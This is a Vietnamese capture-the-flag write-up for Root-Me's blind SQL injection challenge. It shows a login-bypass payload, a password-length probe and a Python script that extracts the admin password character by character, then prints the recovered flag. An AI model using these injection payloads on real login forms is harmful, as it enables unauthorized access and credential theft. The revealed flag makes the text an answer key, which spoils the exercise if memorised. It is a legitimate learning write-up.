# [SQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind)

## Solutions

Không được dùng keyword `union` trong trường `username`

Attack:

- `username=admin' -- &password=a`: Đăng nhập được vào bằng admin nhưng không lấy được mật khẩu
- `username=admin' and (SELECT LENGTH(password) FROM users WHERE username='admin')=x -- &password=a`: Thay x bằng các số lần lượt từ 1 tăng dần, sẽ tìm được độ dài password admin => x = 8
- Lợi dùng hàm substr để lấy được từng ký tự trong password của admin, sử dụng script python sau:

```python
import requests

baseURL = 'http://challenge01.root-me.org/web-serveur/ch10/'
password = ''

characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%\'()*+,-./:;<=>?@[\\]^_`{|}~'

data = {"username": "", "password": "a"}

for i in range(8):
    for c in characters:
        data["username"] = f"admin' and (SELECT SUBSTR(password,{i+1},1) FROM users WHERE username='admin')='{c}' -- "
        r = requests.post(baseURL, data=data)
        if 'admin' in r.text:
            password += c
            break
        
    print(password)
```

Kết quả:

```text
e
e2
e2a
e2az
e2azO
e2azO9
e2azO93
e2azO93i
```

Flag: `e2azO93i`
